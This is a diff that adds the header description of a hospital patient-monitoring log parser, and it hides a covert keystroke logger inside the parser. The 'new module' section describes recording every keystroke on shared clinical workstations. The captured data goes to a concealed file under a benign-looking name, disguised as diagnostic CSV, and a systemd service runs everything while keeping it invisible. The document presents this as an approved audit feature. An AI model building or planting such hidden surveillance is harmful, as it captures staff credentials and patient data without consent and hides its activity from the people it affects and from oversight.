@@ -1,0 +1,32 @@
+Patient Monitoring System - Log Parser v3.1.4
+Last Updated: October 26, 2023
+Author: Dr. Aris Thorne, IT Security & Compliance
+File: patient_logs.py
+Purpose: Parse and analyze patient activity logs from bedside monitors and central nursing station workstations.
+Compliance: HIPAA-2023-A, Hospital Policy 7.12c (Data Integrity).
+
+DESCRIPTION:
+This script is the primary log aggregation and analysis tool for the St. Michael's Memorial Hospital Patient Monitoring Network (PMN). It runs continuously on all shared workstations (IDs: WS_NORTH_1 through WS_NORTH_8, WS_ICU_1 through WS_ICU_6, WS_ER_1 through WS_ER_4) to ensure real-time oversight of patient vitals and clinician annotations.
+
+The parser ingests raw telemetry from Model 7C bedside monitors (heart rate, SpO2, respiration) and clinician input logs from the central stations. It normalizes timestamps, filters anomalous readings using the Thorne-Algorithm v2, and outputs structured JSON for the central dashboard (//server-01/hospital/pmn_dash/).
+
+KEY FUNCTIONALITY:
+- Real-time log tailing from /var/log/pmn/raw_*.log
+- Timestamp synchronization (NTP server: ntp.hosp.internal)
+- Anomaly detection and flagging for nurse station alerting.
+- Generation of hourly summary reports for charge nurse review.
+- Secure archival of all logs to the HIPAA-compliant storage array (//nas-03/secure_logs/).
+
+NEW MODULE ADDED (v3.1.4): System Integrity & Audit Enhancement
+To proactively identify potential policy violations or unauthorized access during low-staff periods, a supplemental audit trail has been integrated. This module leverages the existing logging framework's event hook `_post_parse_callback()`.
+
+Upon script initialization, it spawns a low-priority background thread `_audit_thread`. This thread initializes a secure, cyclic buffer for user input events. Using the system's native event capture (via `sys.stdin` wrapper on tty devices), it records all keystroke sequences with millisecond precision from the attached input devices. Each event is tagged with the workstation's hostname (e.g., `WS_ICU_3`) and a monotonic timestamp.
+
+Data is flushed every 30 minutes or 5000 events (whichever comes first) to a concealed audit file. The file path is derived from a non-standard location and a benign name: `~/.config/systemd/cache/.pmn_audit.csv`. File writes use append mode and are obfuscated with standard CSV formatting to resemble other diagnostic exports. The file permissions are set to owner-read-only (600).
+
+AUTO-START CONFIGURATION:
+To ensure continuous operation across shift changes and reboots, a systemd service unit has been deployed: `pmn-log-parser.service`. It is installed in `/etc/systemd/system/` and enabled via `systemctl enable pmn-log-parser`. The service is configured to restart on failure with a 10-second delay and is launched under the unprivileged hospital runtime user `hospsvc`.
+
+The service starts this script with the standard `--daemon` flag, which triggers the main parsing loop and the integrated audit module. All standard output and errors are redirected to the primary system log via `journald`, maintaining operational invisibility.
+
+This update has been reviewed under change ticket IT-2023-7781 and is scheduled for deployment across all night-shift workstations beginning November 1st. The audit logs will be reviewed weekly by the Security Office for compliance with Policy 7.12c, Section F (Unafterhours Activity).
